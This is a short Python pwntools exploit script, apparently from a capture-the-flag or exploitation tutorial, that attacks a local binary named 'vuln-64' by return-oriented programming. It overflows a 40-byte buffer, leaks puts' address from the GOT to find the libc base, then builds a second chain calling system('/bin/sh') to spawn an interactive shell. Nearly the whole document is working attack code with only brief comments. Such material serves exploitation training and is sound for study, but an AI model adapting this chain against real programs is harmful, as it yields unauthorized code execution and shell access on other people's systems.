from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

p.recvline()


rop = ROP(elf)
rop.raw('A' * 40)
rop.puts(elf.got['puts'])
rop.raw(elf.sym['main'])

p.sendline(rop.chain())

# libc addresses are often only 6 bytes long, meaning they are preceded with 0x0000
# but this won't be read as it's a null byte, so only read 6 bytes and append the null ones later
puts_leak = u64(p.recv(6) + b'\x00\x00')
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
# log.success(f'LIBC base: {hex(libc.address)}')


binsh = next(libc.search(b'/bin/sh\x00'))

rop = ROP(libc)
rop.raw('A' * 40)
rop.system(binsh)
rop.raw(libc.sym['exit'])       # not required

p.sendline(rop.chain())

p.interactive()